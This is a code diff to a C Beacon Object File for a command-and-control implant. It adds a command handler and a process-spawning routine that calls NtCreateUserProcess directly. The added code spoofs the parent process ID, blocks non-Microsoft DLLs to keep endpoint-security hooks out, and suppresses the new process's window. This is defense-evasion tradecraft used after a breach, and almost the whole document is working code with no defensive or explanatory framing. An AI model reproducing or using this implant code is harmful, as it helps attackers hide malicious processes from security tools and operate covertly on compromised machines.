@@ -2,10 +2,17 @@
 #include <beacon.h>
 #include <win32.h>
 
+#define RUN      "run"
+#define PPID     "ppid"
+#define ARGUE    "argue"
+#define BLOCKDLL "blockdlls"
+
 void go(_In_ char* args, _In_ int argc)
 {
     datap Parser     = { 0 };
     
+    PSTR Handle      = NULL;
+
     BOOL Result      = FALSE;
 
     WCHAR wCommand[512];
@@ -20,60 +27,75 @@ void go(_In_ char* args, _In_ int argc)
     PSTR  CurDir      = NULL;
     DWORD CurDirLen   = 0x00;
 
-    DWORD PPid      = 0x00;
-    BOOL  BlockDlls = FALSE;
+    DWORD       PPid    = 0x00;
+    const PCHAR PPidKey = "ppidkeyvalue";
+
+    BOOL        BlockDlls    = FALSE;
+    const PCHAR BlockDllsKey = "blockdllskeyvalue";
 
     BeaconDataParse( &Parser, args, argc );
-
-    //BeaconPrintf("Count of args: %d", argc);
-
-    //BeaconDataStoreGetItem();
-
-    TargetProc = BeaconDataExtract( &Parser, &TargetLen );
-    if ( TargetProc == NULL ){
-        PPid = BeaconDataInt( &Parser );
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] PPid configured to %d\n", PPid);
-    }
     
-    Command    = BeaconDataExtract( &Parser, &CommandLen );
-    CurDir     = BeaconDataExtract( &Parser, &CurDirLen );
-    PPid       = BeaconDataInt( &Parser );
+    Handle = BeaconDataExtract( &Parser, NULL );
 
-    Result = toWideChar( TargetProc, wTargetProc, 1024 );
-    Result = toWideChar( Command, wCommand, 1024 );
-    Result = toWideChar( CurDir, wCurDir, 1024 );
+    if ( StringCompareA( Handle, PPID ) == 0 ) 
+    {
+        BeaconRemoveValue( PPidKey );
+        PPid = BeaconDataInt( &Parser );
+        BeaconAddValue( PPidKey, &PPid );
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] PPid set to %d\n", PPid);
+    } 
+    else if ( StringCompareA( Handle, RUN ) == 0 ) 
+    {
+        TargetProc = BeaconDataExtract(&Parser, &TargetLen);    
+        Command    = BeaconDataExtract(&Parser, &CommandLen);
+        CurDir     = BeaconDataExtract(&Parser, &CurDirLen);
+        //PPid       = BeaconGetValue( PPidKey );
+        //BlockDlls  = BeaconDataInt(&Parser);
 
-    BeaconPrintf(
-        CALLBACK_OUTPUT,
-        "[+] Parsed Args:\n"
-        "   - Target Process: %ls\n"
-        "   - Command Line: %ls\n"
-        "   - Current Directory: %ls\n"
-        "   - PPid: %d\n"
-        "   - Argue: %ls\n",
-        wTargetProc, wCommand, wCurDir, PPid
-    );
+        Result = toWideChar(TargetProc, wTargetProc, 512);
+        Result = toWideChar(Command, wCommand, 512);
+        Result = toWideChar(CurDir, wCurDir, 512);
 
-    if ( !Spawn( wTargetProc, wCommand, wCurDir, PPid, NULL, NULL ) ) 
-       return;
+        BeaconPrintf(
+            CALLBACK_OUTPUT,
+            "[+] Parsed Args:\n"
+            "   - Target Process: %ls\n"
+            "   - Command Line: %ls\n"
+            "   - Current Directory: %ls\n"
+            "   - PPid: %p\n"
+            "   - BlockDlls: %d\n",
+            wTargetProc, wCommand, wCurDir, PPid, BlockDlls
+        );
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawn execution succeeded!");
+        if (!Spawn(wTargetProc, wCommand, wCurDir, PPid, BlockDlls, NULL, NULL)) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] Spawn execution failed!");
+            return;
+        }
+
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawn execution succeeded!");
+    } 
+    else 
+    {
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] Unknown handle command: %s\n", Handle);
+    }
 
     return;
 }
+
 
 BOOL Spawn(
     _In_      PWSTR  TargetProc,
     _In_      PWSTR  Command,
     _In_      PWSTR  CurrentDir,
-    _In_opt_  DWORD  PPid,
-    _In_opt_  BOOL   BlockDlls,
+    _In_      DWORD  PPid,
+    _In_       BOOL   BlockDlls,
     _Out_opt_ HANDLE *hProc,
     _Out_opt_ HANDLE *hThr
 )
 {
     NTSTATUS                     Status    = 0x00;
     PRTL_USER_PROCESS_PARAMETERS ProcParam = NULL;
+    OBJECT_ATTRIBUTES            ObjAttr   = { 0 };
     CLIENT_ID                    ClientId  = { 0 };
     UNICODE_STRING               ImgPath   = { 0 },
                                  CmdLine   = { 0 },
@@ -114,18 +136,27 @@ BOOL Spawn(
 
     if ( PPid != 0x00 )
     {
-        HANDLE  hParentProcess = NULL;
-        
-        NTDLL$NtOpenProcess( &hParentProcess, PROCESS_ALL_ACCESS, ,  );
+        HANDLE  hParentProcess  = NULL;
+        ClientId.UniqueProcess = UlongToHandle( PPid ); 
+
+        NTDLL$NtOpenProcess( &hParentProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientId );
 
         AttributeList->Attributes[1].Attribute	= PS_ATTRIBUTE_PARENT_PROCESS;
         AttributeList->Attributes[1].Size		= sizeof(HANDLE);
         AttributeList->Attributes[1].Value		= hParentProcess;
+
+        BeaconPrintf(CALLBACK_OUTPUT, "ppid in spawn");
     }
 
     if ( BlockDlls )
     {
+    	DWORD64	BlockDllPolicy	= PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+        
+        AttributeList->Attributes[2].Attribute		= PS_ATTRIBUTE_MITIGATION_OPTIONS;
+        AttributeList->Attributes[2].Size			= sizeof(DWORD64);
+        AttributeList->Attributes[2].Value			= &BlockDllPolicy;
 
+        BeaconPrintf(CALLBACK_OUTPUT, "blockdlls in spawn");
     }
 
     PS_CREATE_INFO CreateInfo = {
@@ -133,7 +164,7 @@ BOOL Spawn(
         .State = PsCreateInitialState
     };
     
-    Status = NTDLL$NtCreateUserProcess( &hProc, &hThr, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcParam, &CreateInfo, AttributeList );
+    Status = NTDLL$NtCreateUserProcess( &hProc, &hThr, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, CREATE_NO_WINDOW, NULL, ProcParam, &CreateInfo, AttributeList );
     if (Status != STATUS_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[X] NtCreateUserProcess failed with status: 0x%X", Status); 
         return FALSE;
@@ -183,6 +214,17 @@ SIZE_T StringLengthW(_In_ LPCWSTR String)
     return (String2 - String);
 }
 
+INT StringCompareA(_In_ LPCSTR String1, _In_ LPCSTR String2)
+{
+	for (; *String1 == *String2; String1++, String2++)
+	{
+		if (*String1 == '\0')
+			return 0;
+	}
+
+	return ((*(LPCSTR)String1 < *(LPCSTR)String2) ? -1 : +1);
+}
+
 void InitUnicodeString(_Out_ PUNICODE_STRING UsStruct, _In_opt_ PCWSTR Buffer)
 {
     if ((UsStruct->Buffer = (PWSTR)Buffer))
@@ -197,7 +239,8 @@ void InitUnicodeString(_Out_ PUNICODE_STRING UsStruct, _In_opt_ PCWSTR Buffer)
     else UsStruct->Length = UsStruct->MaximumLength = 0;
 }
 
-PVOID MemCopy( _Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length){
+PVOID MemCopy( _Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
+{
 	PBYTE D = (PBYTE)Destination;
 	PBYTE S = (PBYTE)Source;
 
@@ -207,7 +250,8 @@ PVOID MemCopy( _Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T L
 	return Destination;
 }
 
-VOID MemZero( _Inout_ PVOID Destination, _In_ SIZE_T Size){
+VOID MemZero( _Inout_ PVOID Destination, _In_ SIZE_T Size)
+{
 	PULONG Dest = (PULONG)Destination;
 	SIZE_T Count = Size / sizeof(ULONG);
 
@@ -221,7 +265,8 @@ VOID MemZero( _Inout_ PVOID Destination, _In_ SIZE_T Size){
 	return;
 }
 
-PVOID MemSet(void* Destination, int Value, size_t Size){
+PVOID MemSet(void* Destination, int Value, size_t Size)
+{
 	unsigned char* p = (unsigned char*)Destination;
 	while (Size > 0) {
 		*p = (unsigned char)Value;
